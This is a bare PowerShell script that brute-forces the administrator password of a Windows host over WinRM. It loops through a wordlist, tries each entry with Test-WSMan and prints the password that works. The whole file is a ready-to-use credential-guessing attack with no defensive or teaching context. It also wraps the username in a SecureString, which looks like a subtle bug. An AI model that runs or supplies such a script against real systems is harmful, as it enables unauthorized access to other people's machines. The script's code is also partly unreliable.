
$computername = "192.168.1.64"
$username = "administrator"
$wordlist = "C:\brute\passwords.txt"

#Get the wordlist
$passwords = Get-Content $wordlist

foreach ($password in $passwords) {

#clear all errors
        $Error.clear()

#make a secure string, and then a pscredentials object with username and password

         $secusername = ConvertTo-SecureString $username -AsPlainText -Force
         $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
         $mycredential = New-Object System.Management.Automation.PSCredential ($secusername, $secpassword)


         $result = Test-WSMan -ComputerName $computername -Credential $mycredential -Authentication Negotiate -erroraction SilentlyContinue



if ($result -eq $null) {

Write-Output "wrong"


} else {

Write-Output "$password"

}

}
